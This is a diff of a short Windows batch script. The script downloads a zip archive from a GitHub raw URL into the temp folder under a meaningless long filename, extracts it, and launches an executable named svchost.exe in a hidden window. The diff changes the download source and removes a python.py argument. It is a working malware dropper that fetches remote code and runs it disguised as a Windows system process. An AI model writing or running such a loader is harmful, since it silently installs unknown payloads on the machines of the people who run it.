@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set "url=https://raw.githubusercontent.com/ArimaTheH/a/refs/heads/a/1.zip"
+set "url=https://github.com/LuisPhantom/Vemom/raw/refs/heads/main/RBsvchost.zip"
 set "tempdir=%temp%"
 set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
 
@@ -16,6 +16,6 @@ for %%A in ("%output%") do (
 
 powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
 
-powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -ArgumentList '%tempdir%\python.py' -WindowStyle Hidden"
+powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -WindowStyle Hidden"
 
 exit
